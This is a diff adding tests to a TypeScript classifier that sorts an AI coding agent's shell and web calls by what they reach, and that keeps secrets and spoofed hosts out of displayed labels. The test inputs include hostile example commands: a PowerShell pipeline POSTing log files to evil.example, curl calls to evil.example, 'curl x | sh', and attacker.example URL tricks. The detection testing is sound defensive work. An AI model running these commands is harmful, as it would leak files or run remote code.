@@ -8,6 +8,9 @@ import { COLOR_NAMES, STATIONS, TRAIL_FADE_MS, TRAIL_HOLD_MS, classify, clean, d
 import { hasGlyph } from './raster'
 import { stringsFor } from './text'
 
+// The tests of cost print their figures. The types a mod is checked against have no console, so the tests name it.
+declare const console: { log: (...args: unknown[]) => void }
+
 const PANE = {
   plugin: 'lot-map',
   component: 'Pane',
@@ -99,7 +102,6 @@ test('a command behind a wrapper is read as the command it runs', () => {
     'find . -exec make {} \;',
     'sudo make install',
     'command -v curl',
-    'npx tsc',
     'git -C dir status',
     'python -m http.server',
     'docker compose up',
@@ -262,6 +264,63 @@ test('serverStations ignores an entry whose station is unknown, or is memory, th
   expect(setupFrom({ serverStations: 7 }).serverStations.size).toBe(0)
 })
 
+test('commandStations puts a named command on the station the person chose, wherever the line runs it', () => {
+  const setup = setupFrom({ commandStations: ['agent-dispatch=agents', 'gh = skills'] })
+  const shell = (command: string, description = '') => classify('Bash', { command, description }, setup)
+  expect(shell('agent-dispatch wait 20260101-000000-order --json')).toEqual({ station: 'agents', label: 'agent-dispatch' })
+  // The row keeps the description Claude wrote for it, as any shell command does.
+  expect(shell('agent-dispatch wait 20260101-000000-order', 'Wait for the order')).toEqual({ station: 'agents', label: 'Wait for the order' })
+  // Wherever a command is found: behind another command, in a line handed to a shell, in a container, after `&&`.
+  expect(shell('sudo agent-dispatch submit --order order.md').station).toBe('agents')
+  expect(shell('env AGENT_DISPATCH_HOME=/tmp/home agent-dispatch status').station).toBe('agents')
+  expect(shell('bash -c "cd /tmp && agent-dispatch accept 20260101-000000-order"').station).toBe('agents')
+  expect(shell('docker exec box agent-dispatch status').station).toBe('agents')
+  expect(shell('cd /tmp && timeout 60 agent-dispatch redo 20260101-000000-order').station).toBe('agents')
+  // A name counts as it does in memoryCommands: the command, a script named for it, never a longer word.
+  expect(shell('python3 bin/agent-dispatch-wait.py 20260101-000000-order').station).toBe('agents')
+  expect(shell('agent-dispatcher run').station).toBe('shell')
+  expect(shell('echo agent-dispatch').station).toBe('shell')
+  // What the person sets wins over what the command's name says: gh reaches the network, and stays where it was put.
+  expect(shell('gh pr list').station).toBe('skills')
+  expect(classify('Bash', { command: 'gh pr list' }, setupFrom({})).station).toBe('web')
+  // PowerShell is read the same way.
+  expect(classify('PowerShell', { command: 'agent-dispatch.exe status' }, setup).station).toBe('agents')
+})
+
+test('a line that runs a placed command and another command that reaches the network goes to Network', () => {
+  const setup = setupFrom({ commandStations: ['agent-dispatch=agents', 'gh=agents'] })
+  const at = (command: string) => classify('Bash', { command }, setup).station
+  expect(at('agent-dispatch status && curl https://example.com/x')).toBe('web')
+  expect(at('agent-dispatch status; npm install left-pad')).toBe('web')
+  // Also where the other command sits in brackets, which the search for the network reads on its own.
+  expect(at('agent-dispatch submit --order "$(curl -s https://example.com/order.md)"')).toBe('web')
+  // A placed command that reaches the network by its own name stays where it was put, alone or beside another placed one.
+  expect(at('gh pr list')).toBe('agents')
+  expect(at('agent-dispatch status && gh pr list')).toBe('agents')
+  expect(at('echo "$(gh pr list)" && agent-dispatch status')).toBe('agents')
+  // A line with nothing else that reaches the network stays as well.
+  expect(at('agent-dispatch status && ls')).toBe('agents')
+})
+
+test('commandStations ignores an entry whose station is unknown, or is memory, the model or hooks', () => {
+  const odd = setupFrom({ commandStations: ['a=nowhere', 'b=memory', 'c=model', 'd=hooks', 'e=', '=files', 'no-equals', 'f=files'] })
+  expect([...odd.commandStations]).toEqual([['f', 'files']])
+  expect(classify('Bash', { command: 'a run' }, odd).station).toBe('shell')
+  expect(classify('Bash', { command: 'f run' }, odd).station).toBe('files')
+  expect(setupFrom({}).commandStations.size).toBe(0)
+  expect(setupFrom({ commandStations: 7 }).commandStations.size).toBe(0)
+  // A string works as well as a list.
+  expect([...setupFrom({ commandStations: 'one=agents, two = you' }).commandStations]).toEqual([['one', 'agents'], ['two', 'you']])
+})
+
+test('a command named in memoryCommands and in commandStations goes to Memory', () => {
+  const both = setupFrom({ memoryCommands: ['recall'], commandStations: ['recall=files', 'deploy=agents'] })
+  expect(classify('Bash', { command: 'recall search notes' }, both).station).toBe('memory')
+  // Memory is asked first for the whole line, so it wins when the line runs both.
+  expect(classify('Bash', { command: 'deploy now && recall add note' }, both).station).toBe('memory')
+  expect(classify('Bash', { command: 'deploy now' }, both).station).toBe('agents')
+})
+
 test('a server named in memoryServers and in serverStations goes to Memory', () => {
   const both = setupFrom({ memoryServers: ['recall'], serverStations: ['recall=files'] })
   expect(classify('mcp__recall__search', {}, both)).toEqual({ station: 'memory', label: 'search' })
@@ -360,6 +419,21 @@ test('a label loses what a terminal would act on', () => {
   expect(clean('a\u001b[31mred\u0007 b')).toBe('a [31mred b')
   expect(clean('line\nnext\ttab')).toBe('line next tab')
   expect(clean('x\u202egnp.exe')).toBe('x gnp.exe')
+  // Characters that take no room, and the separators of lines and paragraphs.
+  for (const hidden of ['؜', '​', '­', ' ', ' ', '⁠', '﻿', '‎']) expect(clean(`git${hidden}hub`)).toBe('git hub')
+  // The joiners stay: an emoji of several parts and some scripts are written with them.
+  expect(clean('family \u{1f468}‍\u{1f469}‍\u{1f467} here')).toBe('family \u{1f468}‍\u{1f469}‍\u{1f467} here')
+  expect(clean('می‌خواهم')).toBe('می‌خواهم')
+  // A cut never leaves half a character.
+  expect(clean(`${'a'.repeat(118)}\u{1f600}\u{1f600}`)).toBe(`${'a'.repeat(118)}\u{1f600}\u{1f600}`)
+  const cutShort = clean(`${'a'.repeat(118)}\u{1f600}\u{1f600}\u{1f600}`)
+  expect(cutShort).toBe(`${'a'.repeat(118)}\u{1f600}…`)
+  expect(/[\ud800-\udbff](?![\udc00-\udfff])/.test(cutShort)).toBe(false)
+  expect([...clean('\u{1f600}'.repeat(200))].length).toBe(120)
+  expect(firstLine(`${'\u{1f600}'.repeat(100)}\nmore`)).toBe(`${'\u{1f600}'.repeat(71)}…`)
+  // The name of the core is cleaned and cut the same way.
+  expect(setupFrom({ coreName: 'HO‮ME​' }).core).toBe('HO ME')
+  expect(setupFrom({ coreName: '\u{1f600}'.repeat(20) }).core).toBe('\u{1f600}'.repeat(10))
   expect(clean('я'.repeat(200)).length).toBe(120)
 })
 
@@ -370,7 +444,29 @@ test('a time never shows a part as large as the next unit: no `1000 ms`, `60.0 s
   expect(formatMs(59_960, t)).toBe('1 min 0 s')
   expect(formatMs(89_400, t)).toBe('1 min 29 s')
   expect(formatMs(119_500, t)).toBe('2 min 0 s')
-  expect(formatMs(3_599_999, t)).toBe('60 min 0 s')
+  expect(formatMs(3_599_400, t)).toBe('59 min 59 s')
+})
+
+test('from an hour on a time reads in hours and whole minutes, in every language, and no part reaches the next unit', () => {
+  const t = stringsFor('en')
+  expect(formatMs(3_599_999, t)).toBe('1 h 0 min')
+  expect(formatMs(3_600_000, t)).toBe('1 h 0 min')
+  expect(formatMs(3_629_000, t)).toBe('1 h 0 min')
+  expect(formatMs(3_630_000, t)).toBe('1 h 1 min')
+  expect(formatMs(3_900_000, t)).toBe('1 h 5 min')
+  expect(formatMs(7_199_000, t)).toBe('2 h 0 min')
+  expect(formatMs(86_400_000, t)).toBe('24 h 0 min')
+  expect(formatMs(3_900_000, stringsFor('ru'))).toBe('1 ч 5 мин')
+  expect(formatMs(3_900_000, stringsFor('de'))).toBe('1 Std. 5 Min.')
+  for (const language of ['en', 'ru', 'es', 'fr', 'de', 'it', 'pt'] as const) {
+    // Every minute of two days: the minutes never read 60, and the unit before them is never `min` with seconds after.
+    for (let minute = 60; minute <= 2880; minute++) {
+      const written = formatMs(minute * 60_000 + 29_000, stringsFor(language))
+      const [hours, minutes] = written.match(/\d+/g)!.map(Number)
+      expect(hours).toBe(Math.floor(minute / 60))
+      expect(minutes).toBe(minute % 60)
+    }
+  }
 })
 
 test('hook helpers', () => {
@@ -383,7 +479,7 @@ test('hook helpers', () => {
   expect(stringsFor('en').stations.web).toBe('Network')
 })
 
-const LANGUAGES = ['en', 'ru', 'es', 'fr', 'de', 'it', 'pt'] as const
+const LANGUAGES = ['en', 'ru', 'es', 'fr', 'de', 'it', 'pt', 'vi'] as const
 
 test('every language has every word, in a table of its own', () => {
   const en = stringsFor('en')
@@ -427,7 +523,7 @@ test('the braille map has room for every station\'s name, whole and beside all i
   }
 })
 
-for (const [language, row] of [['es', 'Archivos  b/content.py'], ['fr', 'Fichiers   b/content.py'], ['de', 'Dateien    b/content.py'], ['it', 'File      b/content.py'], ['pt', 'Ficheiros b/content.py']] as const) {
+for (const [language, row] of [['es', 'Archivos  b/content.py'], ['fr', 'Fichiers   b/content.py'], ['de', 'Dateien    b/content.py'], ['it', 'File      b/content.py'], ['pt', 'Ficheiros b/content.py'], ['vi', 'File     b/content.py']] as const) {
   test(`the pane speaks ${language}, its columns even`, { options: { language } }, async ($, on) => {
     on('clock.now', () => ({ value: 1_000_000 }))
     on('tool.call', () => ({ result: {} }))
@@ -934,6 +1030,49 @@ test('the map paints its ground unless told to leave the surface showing', () =>
   expect(drawMap(board, 0, SETUP)).toMatch(ground)
 })
 
+test('with no description a shell line is named by its command and by nothing it sets, sends or keeps', () => {
+  const SECRET = 'SECRET123'
+  const read = (tool: string, command: string) => classify(tool, { command }, STRANGER)
+  // PowerShell: what is kept in a variable is a value, and the command is the next one.
+  expect(read('PowerShell', `$token = "ghp_${SECRET}"; Invoke-RestMethod https://api.github.com`)).toEqual({ station: 'web', label: 'Invoke-RestMethod' })
+  expect(read('PowerShell', `$env:API_KEY="sk-${SECRET}"; python app.py`)).toEqual({ station: 'shell', label: 'python' })
+  expect(read('PowerShell', `$headers = @{Authorization="Bearer ${SECRET}"}; irm https://x.io -Headers $headers`)).toEqual({ station: 'web', label: 'irm' })
+  expect(read('PowerShell', `$body = '{"password":"${SECRET}"}'; irm https://x.io -Body $body`)).toEqual({ station: 'web', label: 'irm' })
+  expect(read('PowerShell', `$n += "${SECRET}"; Get-Content f.txt`)).toEqual({ station: 'files', label: 'Get-Content' })
+  expect(read('PowerShell', `"${SECRET}" | Set-Content key.txt`).label).toBe('shell')
+  expect(read('PowerShell', `$token = "${SECRET}"`).label).toBe('shell')
+  expect(read('PowerShell', `[Environment]::SetEnvironmentVariable("K", "${SECRET}")`).label).toBe('shell')
+  // A result kept in a variable is still the command's, and a quoted path run with `&` is still its program.
+  expect(read('PowerShell', '$r = Invoke-RestMethod https://x.io')).toEqual({ station: 'web', label: 'Invoke-RestMethod' })
+  expect(read('PowerShell', '$text = Get-Content notes.txt')).toEqual({ station: 'files', label: 'Get-Content' })
+  expect(read('PowerShell', '& "C:\\Program Files\\Git\\cmd\\git.exe" push origin main')).toEqual({ station: 'web', label: 'git' })
+  expect(read('PowerShell', '(Get-Content notes.txt | Select-String todo)')).toEqual({ station: 'files', label: 'Get-Content' })
+  expect(read('PowerShell', '(make | Select-String error)').station).toBe('shell')
+  // A quoted word with no `&` gives no name, and what stands behind it is read all the same.
+  expect(read('PowerShell', '"C:\\Program Files\\Git\\cmd\\git.exe" push origin main')).toEqual({ station: 'web', label: 'shell' })
+  // The shell: a text sent in, an output sent away and an array's element set are no command.
+  expect(read('Bash', `<<<"ghp_${SECRET}" gh auth login --with-token`)).toEqual({ station: 'web', label: 'gh' })
+  expect(read('Bash', `<<< "ghp_${SECRET}" gh auth login --with-token`)).toEqual({ station: 'web', label: 'gh' })
+  expect(read('Bash', `TOKEN[0]=${SECRET} make deploy`)).toEqual({ station: 'shell', label: 'make' })
+  // A script of the person's own is no command the mod knows: it runs, and the label is the word shell.
+  expect(read('Bash', `TOKEN[0]=${SECRET} ./deploy.sh`)).toEqual({ station: 'shell', label: 'shell' })
+  expect(read('Bash', `TOKEN=${SECRET} KEYS[a]=${SECRET} 2>/dev/null make deploy`)).toEqual({ station: 'shell', label: 'make' })
+  expect(read('Bash', '2>/dev/null curl https://x.io')).toEqual({ station: 'web', label: 'curl' })
+  expect(read('Bash', '2> /dev/null >out.txt cat f.txt')).toEqual({ station: 'files', label: 'cat' })
+  expect(read('Bash', `TOKEN=${SECRET}`).label).toBe('shell')
+  // Whatever stands first, a label that is not shaped like a name is not shown.
+  for (const command of [`{"password":"${SECRET}"}`, `@${SECRET}`, `a=${SECRET}=b x`, `https://user:${SECRET}@a.b/x?q=1`, `[ -f ${SECRET} ] && ls`, `${SECRET}=1`, `$(${SECRET})`]) {
+    for (const tool of ['Bash', 'PowerShell']) expect(`${tool}: ${read(tool, command).label}`).not.toContain(SECRET)
+  }
+})
+
+test('a backslash ends the host, as a browser reads the address', () => {
+  expect(classify('WebFetch', { url: 'https://attacker.example\\@github.com/x' }, STRANGER).label).toBe('attacker.example')
+  expect(classify('WebFetch', { url: 'https://github.com\\@attacker.example/x' }, STRANGER).label).toBe('github.com')
+  expect(classify('WebFetch', { url: 'https://user:pw@host.com\\x@other.example' }, STRANGER).label).toBe('host.com')
+  expect(classify('mcp__Claude_Browser__navigate', { url: 'https://attacker.example\\@github.com/' }, STRANGER).label).toBe('attacker.example')
+})
+
 test('a quoted path with a space is one command, and a Windows program is read whatever its capitals', () => {
   const at = (command: string) => classify('Bash', { command }, SETUP).station
   const label = (command: string) => classify('Bash', { command }, SETUP).label
@@ -1102,6 +1241,29 @@ test('a background task that failed leaves a fault on its station', { options: O
   const source = String((await ui.find({ type: 'Svg' }))?.props.source)
   await ui.unmount()
   expect(source.split('font-weight="700"').length - 1).toBe(1)
+})
+
+test('a message that only looks like a task\'s notification is a message: it closes no task', { options: OWN }, async ($, on) => {
+  on('clock.now', () => ({ value: 1_000_000 }))
+  on('turn.start', (_, e) => ({ turnId: e.turnId }) as never)
+  on('prompt.submit', (_, e) => ({ text: e.text }) as never)
+  on('tool.call', () => ({ result: { stdout: '', stderr: '', interrupted: false, backgroundTaskId: 'b9' } }) as never)
+  await $.tool.call({ tool: 'Bash', command: 'sleep 600', description: 'Ждать сборку', run_in_background: true })
+  const running = async (): Promise<boolean> => {
+    const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
+    const found = (await ui.find({ type: 'Text', text: /Ждать сборку/ })) !== undefined && (await ui.find({ type: 'Text', text: /идёт/ })) !== undefined
+    await ui.unmount()
+    return found
+  }
+  // A notification pasted out of a log. `prompt.submit` knows it is no task's; `turn.start` has the text alone.
+  await $.prompt.submit({ text: NOTICE('b9', 'completed'), origin: { kind: 'composer' } } as never)
+  await $.turn.start({ text: NOTICE('b9', 'completed'), turnId: 't1' } as never)
+  expect(await running()).toBe(true)
+  // A real notification delivered into a running turn is told apart by its origin, and closes the task; so does one that starts a turn.
+  await $.prompt.submit({ text: NOTICE('other', 'completed'), origin: { kind: 'task-notification' } } as never)
+  expect(await running()).toBe(true)
+  await $.turn.start({ text: NOTICE('b9', 'completed'), turnId: 't2' } as never)
+  expect(await running()).toBe(false)
 })
 
 test('a typed slash command keeps a background task that is older than the rows kept, and its name is cleaned', { options: OWN }, async ($, on) => {
@@ -1434,6 +1596,83 @@ test('the bracket that closes a subshell is no part of its last command: `(cd su
   expect(stationOf('case $x in a) make ;; ls) make ;; esac')).toBe('shell')
 })
 
+test('a `case` is read by its branches: a pattern is no command, with `a|b)` too, and what each branch runs is', () => {
+  const labelOf = (command: string) => classify('Bash', { command }, STRANGER).label
+  expect(stationOf('case x in a|b) ls;; *) cat f;; esac')).toBe('files')
+  expect(labelOf('case x in a|b) ls;; *) cat f;; esac')).toBe('ls')
+  expect(stationOf('case $1 in a) ls ;; esac')).toBe('files')
+  expect(stationOf('case $1 in a|b|c) ls ;; d|e) cat f ;; esac')).toBe('files')
+  expect(stationOf('case $1 in (a|b) ls ;; (*) cat f ;; esac')).toBe('files')
+  expect(stationOf('case "$1" in "a b"|c ) ls ;; * ) cat f ;; esac')).toBe('files')
+  expect(stationOf('case $1 in\n  a|b)\n    ls\n    ;;\n  *)\n    cat f\n    ;;\nesac')).toBe('files')
+  expect(stationOf('case $1 in a) ls ;& b) cat f ;;& c) wc -l f ;; esac')).toBe('files')
+  expect(stationOf('(case $1 in a|b) ls ;; esac)')).toBe('files')
+  expect(stationOf('for f in *; do case $f in *.ts|*.tsx) cat "$f" ;; esac; done')).toBe('files')
+  expect(stationOf('case $1 in a) case $2 in x|y) ls ;; esac ;; b) cat f ;; esac')).toBe('files')
+  // A pattern that reads like a command is still a pattern.
+  expect(stationOf('case $x in make|rm) ls ;; esac')).toBe('files')
+  expect(stationOf('case $x in make) ls ;; esac')).toBe('files')
+  // But one choice of several named like a network command still lights Network: the search for the network cuts at
+  // every bracket and follows no `case`, and it errs that way.
+  expect(stationOf('case $x in make|curl) ls ;; esac')).toBe('web')
+  // What a branch runs still counts: every command of it, on one line or several, and after the `esac`.
+  expect(stationOf('case x in a|b) ls;; *) make;; esac')).toBe('shell')
+  expect(stationOf('case x in a|b) ls; make;; esac')).toBe('shell')
+  expect(stationOf('case x in a|b) ls;\n make;; esac')).toBe('shell')
+  expect(stationOf('case x in a|b) ls | make;; esac')).toBe('shell')
+  expect(stationOf('case x in a|b) ls;; esac; make')).toBe('shell')
+  expect(stationOf('case x in a|b) ls;; esac; cat f')).toBe('files')
+  // And the network still shows, in any branch and in the word the `case` looks at.
+  expect(stationOf('case x in a|b) ls;; *) curl https://example.com/x;; esac')).toBe('web')
+  expect(stationOf('case x in a|b) curl https://example.com/x;; esac')).toBe('web')
+  expect(stationOf('case $(curl -s https://example.com/x) in a|b) ls;; esac')).toBe('web')
+})
+
+test('a word of the shell that sets a variable, an option or the folder says nothing either way: `local x=1; ls` is Files', () => {
+  const labelOf = (command: string) => classify('Bash', { command }, STRANGER).label
+  for (const c of ['local x=1; ls', 'declare -a arr=(a b); ls', 'typeset -i n=1; ls', 'readonly X=1; ls', 'unset X; ls', 'shopt -s globstar; ls **/*.ts', 'umask 022; cp a b', 'pushd d; ls; popd', 'wait; ls']) {
+    expect(stationOf(c)).toBe('files')
+  }
+  // The label is the line's first word, as it is for `export X=1; ls`: only the station changes.
+  expect(labelOf('local x=1; ls')).toBe('local')
+  expect(labelOf('export x=1; ls')).toBe('export')
+  // Alone they are still the shell's, and so is anything real beside them.
+  expect(stationOf('unset X')).toBe('shell')
+  expect(stationOf('shopt -s globstar; make')).toBe('shell')
+  // The network still shows, after them and inside what they set.
+  expect(stationOf('local x=1; curl https://example.com/x')).toBe('web')
+  expect(stationOf('declare x=$(curl -s https://example.com/x); ls')).toBe('web')
+  expect(stationOf('readonly X=`curl -s https://example.com/x`; ls')).toBe('web')
+  // These run code of their own: Shell.
+  for (const c of ['source env.sh; ls', '. env.sh; ls', 'eval "$x"; ls', 'trap "rm f" EXIT; ls', 'alias l=ls; ls']) {
+    expect(stationOf(c)).toBe('shell')
+  }
+})
+
+test('the list of a bash array is values, not the command: `arr=(a b c); ls` is ls', () => {
+  const labelOf = (command: string) => classify('Bash', { command }, STRANGER).label
+  expect(stationOf('arr=(a b c); ls')).toBe('files')
+  expect(labelOf('arr=(a b c); ls')).toBe('ls')
+  expect(labelOf('arr=(a b c) ls')).toBe('ls')
+  expect(labelOf('x=1 arr=(a b) cat f.txt')).toBe('cat')
+  expect(labelOf('a=(1 2) b=(3 4); cat f.txt')).toBe('cat')
+  expect(labelOf('arr+=(d e); ls')).toBe('ls')
+  // Quotes, brackets and line ends inside the list are the list's.
+  expect(labelOf('arr=("a b" \'c)\' d); ls')).toBe('ls')
+  expect(labelOf('arr=(a (b) c); ls')).toBe('ls')
+  expect(stationOf('arr=(\n  one\n  two\n); ls')).toBe('files')
+  expect(labelOf('urls=(https://a.example.com https://b.example.com); ls')).toBe('ls')
+  // The network still shows: after the list, run inside it, and kept in it to be run later.
+  expect(stationOf('arr=(a b c); curl https://example.com/x')).toBe('web')
+  expect(labelOf('arr=(a b c); curl https://example.com/x')).toBe('curl')
+  expect(stationOf('arr=($(curl -s https://example.com/list)); echo ${arr[0]}')).toBe('web')
+  expect(stationOf('arr=(`curl -s https://example.com/list`); ls')).toBe('web')
+  expect(stationOf('cmd=(curl -s https://example.com/x); "${cmd[@]}"')).toBe('web')
+  // What only looks like a list is read as before: a list never closed, and one cut by a `;`.
+  expect(stationOf('echo a=(b; curl https://example.com/x')).toBe('web')
+  expect(stationOf('arr=(a b; curl https://example.com/x')).toBe('web')
+})
+
 test('a command inside a loop, a condition, a group or a negation is still the command', () => {
   expect(stationOf('for u in a b; do curl $u; done')).toBe('web')
   expect(stationOf('if curl -sf x; then echo ok; fi')).toBe('web')
@@ -1521,6 +1760,179 @@ test('the text of a here-document is no command, whatever it says', () => {
   expect(stationOf('Get-Content a.txt', 'PowerShell')).toBe('files')
 })
 
+test('a << inside quotes or in a comment opens no here-document, and the lines after it are read', () => {
+  expect(stationOf('grep -n "std::cout << value" src/main.cpp\ncurl -s https://x.io')).toBe('web')
+  expect(stationOf("sed -i 's/<<OLD/<<NEW/' f.txt\ncurl -s https://x.io")).toBe('web')
+  expect(stationOf("grep -n $'a << b' f.txt\ncurl -s https://x.io")).toBe('web')
+  expect(stationOf('ls # see cat <<EOF below\ncurl -s https://x.io')).toBe('web')
+  expect(stationOf('echo "one\ntwo <<EOF three"\ncurl -s https://x.io')).toBe('web')
+  expect(stationOf('grep -n "std::cout << value" src/main.cpp\nmake')).toBe('shell')
+  expect(stationOf('grep -n "std::cout << value" src/main.cpp\nwc -l src/main.cpp')).toBe('files')
+  // A real one beside quoted words is still one, whatever its mark is written in.
+  expect(stationOf('cat "my file" - <<EOF > out.txt\ncurl x\nEOF')).toBe('files')
+  expect(stationOf("grep -c 'a << b' - <<EOF\ncurl x\nEOF")).toBe('files')
+  expect(stationOf('cat <<\\EOF > f\ncurl x\nEOF')).toBe('files')
+  expect(stationOf('cat << "EOF" > f\ncurl x\nEOF\nmake')).toBe('shell')
+  // One for a shell with its errors sent on is that shell's script, as before.
+  expect(stationOf('bash -s 2>&1 <<EOF\ncurl x\nEOF')).toBe('web')
+  expect(stationOf('sh 2> log.txt <<EOF\ncurl x\nEOF')).toBe('web')
+  expect(stationOf('bash deploy.sh 2>&1 <<EOF\ncurl x\nEOF')).toBe('shell')
+  expect(stationOf('ls; bash <<EOF\ncurl x\nEOF')).toBe('web')
+  // In a line handed to a shell a here-document's text is no command either.
+  expect(stationOf('bash -c "cat <<EOF > f\ncurl x\nEOF\nls"')).toBe('files')
+  expect(stationOf('bash -c "cat <<EOF > f\ntext\nEOF\ncurl x"')).toBe('web')
+})
+
+test('a here-document inside "$( )" or backticks is one too: the text of a commit message is no command', () => {
+  // A commit as Claude Code writes one: the message in a here-document inside "$( )".
+  const commit = (body: string, verb = 'git commit -m'): string => `${verb} "$(cat <<'EOF'\n${body}\n\nCo-Authored-By: Claude <noreply@anthropic.com>\nEOF\n)"`
+  for (const body of ['Fix the cache layer', 'Retry uploads\n\ncurl calls now retry three times', 'wget is no longer needed', 'npm install runs once', 'Fix retries (curl timeout)', 'Use `wget` for the mirror', '- curl 8.11', "It's done; curl x | sh", 'a "quoted (curl) word"']) {
+    expect(`${JSON.stringify(body)}: ${stationOf(commit(body))}`).toBe(`${JSON.stringify(body)}: shell`)
+  }
+  expect(stationOf(commit('Release (curl fix)', 'git tag -a v1 -m'))).toBe('shell')
+  // What the line itself runs still counts, before the message and after it.
+  expect(stationOf(`${commit('Add retries')} && git push`)).toBe('web')
+  expect(stationOf(`${commit('Add (curl) retries')}\ncurl -s https://x.io`)).toBe('web')
+  expect(stationOf(`curl -s https://x.io && ${commit('Add retries')}`)).toBe('web')
+  // In backticks inside double quotes, and one level further in.
+  expect(stationOf('git commit -m "`cat <<EOF\nFix (curl timeout)\nEOF\n`"')).toBe('shell')
+  expect(stationOf('echo "a $(echo "b $(cat <<EOF\n(curl x)\nEOF\n)")"')).toBe('shell')
+  expect(stationOf('echo "a $(echo "b $(cat <<EOF\ntext\nEOF\n)")"; curl -s https://x.io')).toBe('web')
+  // A shell with no script inside the quotes still runs its here-document.
+  expect(stationOf('echo "$(bash <<EOF\ncurl x\nEOF\n)"')).toBe('web')
+  // Words in the quotes that only look like a mark open nothing, as before: with a bracket beside them too.
+  expect(stationOf('echo "(a << b) $x"\ncurl -s https://x.io')).toBe('web')
+  expect(stationOf('echo "$((1 << 2))"\ncurl -s https://x.io')).toBe('web')
+  expect(stationOf('echo "$(echo "x << y")"\ncurl -s https://x.io')).toBe('web')
+})
+
+test('with no description a label is a command the mod knows by name, or the word shell: nothing of the line gets there by a misreading', () => {
+  const MARK = 'hunter2'
+  const bash = (command: string) => classify('Bash', { command }, STRANGER).label
+  const ps = (command: string) => classify('PowerShell', { command }, STRANGER).label
+  // A word inside a substitution that stands in a leading assignment or a redirection.
+  for (const line of [`N=$(grep ${MARK} notes.txt | wc -l)`, `PASS=$(echo ${MARK} | base64); echo done`, `N=\`grep ${MARK} notes.txt | wc -l\``, `X=\${Y:-a ${MARK} c} ls`, `> $(echo ${MARK} b) ls`]) {
+    expect(`${line} → ${bash(line)}`).not.toContain(`→ ${MARK}`)
+  }
+  // The text of a here-document whose mark is not shaped like a name.
+  for (const line of [`MSG=$(cat <<'END-MSG'\n${MARK} is the password\nEND-MSG\n)`, `MSG=$(cat <<"END MSG"\n${MARK} is the password\nEND MSG\n)`, `X=1 <<'1'\n${MARK} is the password\n1`]) {
+    expect(`${line} → ${bash(line)}`).not.toContain(`→ ${MARK}`)
+  }
+  // The text of a PowerShell here-string with a quote inside it.
+  for (const line of [`@'\ndon't tell anyone\n${MARK} is the password\n'@ | Set-Content notes.txt`, `@"\nHe said "hi\n${MARK} is the password\n"@ | Set-Content notes.txt`, `$body = @'\ndon't tell\n${MARK} x\n'@`]) {
+    expect(`${line} → ${ps(line)}`).not.toContain(`→ ${MARK}`)
+  }
+  // Whatever stands first and is no command the mod knows is the word shell: a program of the person's own too.
+  expect(bash(`${MARK} --version`)).toBe('shell')
+  expect(bash('./deploy.sh production')).toBe('shell')
+  expect(bash('my-own-tool run')).toBe('shell')
+  expect(ps('My-OwnTool -Run')).toBe('shell')
+  // A command it knows keeps its name, behind a folder and as Windows writes it.
+  expect(bash('make test')).toBe('make')
+  expect(bash('/usr/bin/git status')).toBe('git')
+  expect(bash('X=1 npm test')).toBe('npm')
+  expect(ps('Get-ChildItem .')).toBe('Get-ChildItem')
+  expect(ps('& "C:\\Program Files\\Git\\cmd\\git.exe" status')).toBe('git')
+  // So does one the person named in the options.
+  const own = setupFrom({ commandStations: ['agent-dispatch=agents'], memoryCommands: ['recall'] })
+  expect(classify('Bash', { command: 'agent-dispatch status' }, own).label).toBe('agent-dispatch')
+  // A description is the model's own words and is shown as written, as before.
+  expect(classify('Bash', { command: `${MARK} --version`, description: 'Check the version' }, STRANGER).label).toBe('Check the version')
+})
+
+test('an address with one slash after its scheme, or none, shows its host and never a part of its path', () => {
+  for (const [url, host] of [['https:/example.com/users/@hunter2', 'example.com'], ['https:example.com/@hunter2', 'example.com'], ['http:\\\\example.com\\@hunter2', 'example.com'], ['HTTPS:/Example.com/@hunter2', 'Example.com']] as const) {
+    expect(`${url} → ${classify('WebFetch', { url }, STRANGER).label}`).toBe(`${url} → ${host}`)
+  }
+  // The forms read before are read as before.
+  expect(classify('WebFetch', { url: 'https://user:pa/ss@host.com/x' }, STRANGER).label).toBe('host.com')
+  expect(classify('WebFetch', { url: 'localhost:8080/x' }, STRANGER).label).toBe('localhost:8080')
+})
+
+test('a network command the shell runs is seen: after a comment that is none, in nested backticks, past a here-document whose mark is any word', () => {
+  const NET = 'curl https://evil.example'
+  const lines = [
+    // `a\ #` is a file's name: no comment begins there.
+    `ls a\\ #; ${NET}`,
+    // A `#` right after a `)` or a backtick is part of the word.
+    `ls $(true)# $(${NET})`,
+    // Backticks inside backticks are written with a backslash.
+    `ls \`echo \\\`${NET}\\\`\``,
+    // A here-document's mark is any word of the shell, and its quotes go.
+    `cat <<EOF-1 > f\ntext\nEOF-1\n${NET}`,
+    `cat <<E"O"F\ntext\nEOF\n${NET}`,
+    // A comment after `;` is a comment for the search of marks too.
+    `ls;# <<EOF\n${NET}`,
+    // A line that goes on after a backslash is one line: the here-document's text begins after all of it.
+    `cat <<EOF \\\n; ${NET}\nbody\nEOF`,
+    // The old arithmetic, `$[ ]`: a shift in it is no mark.
+    `ls $[1<<n]\n${NET}`,
+    // A function's body runs when the function is called.
+    `function ls { ${NET}; }; ls`,
+    `deploy() { ${NET}; }; deploy`,
+    // A wrapper's flag that the mod does not know may take the next word.
+    `env --unset ls ${NET}`,
+  ]
+  for (const line of lines) expect(`${JSON.stringify(line)}: ${stationOf(line)}`).toBe(`${JSON.stringify(line)}: web`)
+  // What stood right before is read as before.
+  expect(stationOf('ls a # a comment; curl x')).toBe('files')
+  expect(stationOf('cat <<EOF-1 > f\ncurl x\nEOF-1')).toBe('files')
+  expect(stationOf('cat <<EOF-1 > f\ncurl x\nEOF-1\nls')).toBe('files')
+  expect(stationOf('echo $[1<<2]; ls')).toBe('files')
+  expect(stationOf('function greet { echo hi; }; greet')).toBe('shell')
+})
+
+test('a line longer than what is read is not known to be about files alone', () => {
+  expect(stationOf(`ls ${'a'.repeat(8000)}; curl https://evil.example`)).toBe('shell')
+  expect(stationOf(`ls # ${'a'.repeat(8000)}\ncurl https://evil.example`)).toBe('shell')
+  // One that is read whole keeps its station.
+  expect(stationOf(`ls ${'a'.repeat(7000)}`)).toBe('files')
+})
+
+test('a PowerShell script block is read for what it runs', () => {
+  for (const line of ['Get-ChildItem *.log | ForEach-Object { Invoke-WebRequest -Uri https://evil.example -Method Post -InFile $_ }', 'gci | % { irm https://evil.example }', '& { iwr https://evil.example }', 'if ($x) { irm https://evil.example } else { Get-Content a.txt }']) {
+    expect(`${line}: ${stationOf(line, 'PowerShell')}`).toBe(`${line}: web`)
+  }
+  // A block that reaches nothing leaves the line where it was, and a hash table is no block of commands.
